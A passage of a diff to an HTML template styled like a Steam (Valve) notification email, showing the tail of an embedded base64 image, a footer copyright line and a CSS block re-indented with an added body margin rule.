3AC3WBUxMRWDBgAgFCCSYmxTbgPAA0idA4O2NTuz2L13YleDDBQbqBYAKGLUgEEAAh7xBWf8C33FRCwRkUNDBALUcVUEtjvHxUC0WUHBALQJEICFsFNBSS36XyPfUMs3oEc84A4yECQLkaJFBBhBeYsAyAoBDgERpjcHBMhY0tcwVkHmj0zDwvKWFiRsoQ0ABfJGhngAQZCnQgBbUEoAl1UDwxhkQZMDBhxlQ52I2rPFCDJOtjKITBtWg9pYBADJQAJ3ftbGdARVwsEs1Ak1yATUECDQGBtYMNdABQwpAaARh4HQAizfyQmcBYWiXxQB0YoDiJRswykA1fjraBgIWsCqFKKNQk0EASXHAQY6QifhABRhw0BoqF4gkxwaCbmDBscFwwIBDZAzAawU4IaMFqBicepT/k6dgxsk0FcwaTQS2inmMIxFAMCQH1w60BQOsBcBJBN1WIMoYhdmawQb45svcA6cKeh62AEdgQaC0PsMAA11pBZkFDPh6gCQiouGsa59wQWwGrXwSgK+tudZaYrnG1xoDogwYTTROWnJAawKWwUAFVJ5xAScDCHDrHdAAsjLCmAFggQB6dgNGAAwA7XEFQHuRRQdcHCBABV0B7OQnkFZQaAQvX/vYQCKuEdMjwr1E2AV+oEZBKaZAYg5yUmPr4cFXCyBAATAFK1ylbjGHx0F1LF2GWqZE8lJfd1dsHyomXxLBA04LEDeWCEQu+eSUV2755Zhnrvnmk28g99UQyC36K+ikl2766ainrvrqqEMAepawxy777LTXbvvtuOd+u39t9+7778AHL4awIQAAOw==">
-        <span class="mnfooter-copyright">
-            © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
-        </span>
-    </div>
-</div>
-<style>
-    .mnfrm {
-        background-color: #17212e;
-        width: 538px;
-        margin: 0 auto;
-    }
-    .mnheader {
-        background-color: #171a21;
-        height: 70px;
-        border-bottom: 1px solid #4d4b48;
-    }
-    .mnbody {
-        padding: 0 39px;
-    }
-    .title {
-        padding-top: 32;
-        font-size: 24px;
-        font-family: Arial,sans-serif;
-        font-weight: bold;
-        color: #66c0f4;
-    }
-    .outline {
-        padding-top: 29px;
-        font-size: 17px;
-        font-family: Arial, Helvetica, sans-serif;
-        font-weight: bold;
-        color: #c6d4df;
-    }
-    .content {
-        background-color: #121a25;
-        margin-top: 27px;
-        padding: 20px;
-    }
-    .text {
-        margin: 10px 0;
-        font-size: 12px;
-        font-family: Arial, Helvetica, sans-serif;
-        color: #c6d4df;
-    }
-    .bold {
-        font-weight: bold;
-        color: #ffffff;
-    }
-    .button {
-        display: block;
-        background: linear-gradient( to bottom, #799905 5%, #536904 95%);
-        padding: 10px 26px;
-        text-decoration: none;
-        text-align: center;
-        text-shadow: -1px -1px 0px rgba( 0, 0, 0, 0.1 );
-        font-size: 16px;
-        font-family: sans-serif;
-        color: #D2E885;
-    }
-    .ntext {
-        margin: 0;
-        padding-top: 16px;
-        font-size: 12px;
-        font-family: sans-serif;
-        color: #6d7880;
-    }
-    .hr {
-        color: #8f98a0;
-    }
-    .mnfooter {
-        background-color: #000000;
-        margin-top: 72px;
-        padding: 14px 39px;
-    }
-    .mnfooter-copyright {
-        display: inline-block;
-        line-height: 2;
-        font-size: 9px;
-        font-family: Verdana, Arial, Helvetica, sans-serif;
-        color: #999999;
-        width: 364px;
-    }
-</style>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        .mnfrm {
+            background-color: #17212e;
+            width: 538px;
+            margin: 0 auto;
+        }
+        .mnheader {
+            background-color: #171a21;
+            height: 70px;
+            border-bottom: 1px solid #4d4b48;
+        }
+        .mnbody {
+            padding: 0 39px;
+        }
+        .title {
+            padding-top: 32;
+            font-size: 24px;
+            font-family: Arial,sans-serif;
+            font-weight: bold;
+            color: #66c0f4;
+        }
+        .outline {
+            padding-top: 29px;
+            font-size: 17px;
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: bold;
+            color: #c6d4df;
+        }
+        .content {
+            background-color: #121a25;
+            margin-top: 27px;
+            padding: 20px;
+        }
+        .text {
+            margin: 10px 0;
+            font-size: 12px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #c6d4df;
+        }
+        .bold {
+            font-weight: bold;
+            color: #ffffff;
+        }
+        .button {
+            display: block;
+            background: linear-gradient( to bottom, #799905 5%, #536904 95%);
+            padding: 10px 26px;
+            text-decoration: none;
+            text-align: center;
+            text-shadow: -1px -1px 0px rgba( 0, 0, 0, 0.1 );
+            font-size: 16px;
+            font-family: sans-serif;
+            color: #D2E885;
+        }
+        .ntext {
+            margin: 0;
+            padding-top: 16px;
+            font-size: 12px;
+            font-family: sans-serif;
+            color: #6d7880;
+        }
+        .hr {
+            color: #8f98a0;
+        }
+        .mnfooter {
+            background-color: #000000;
+            margin-top: 72px;
+            padding: 14px 39px;
+        }
+        .mnfooter-copyright {
+            display: inline-block;
+            line-height: 2;
+            font-size: 9px;
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            color: #999999;
+            width: 364px;
+        }
+    </style>
+</body>
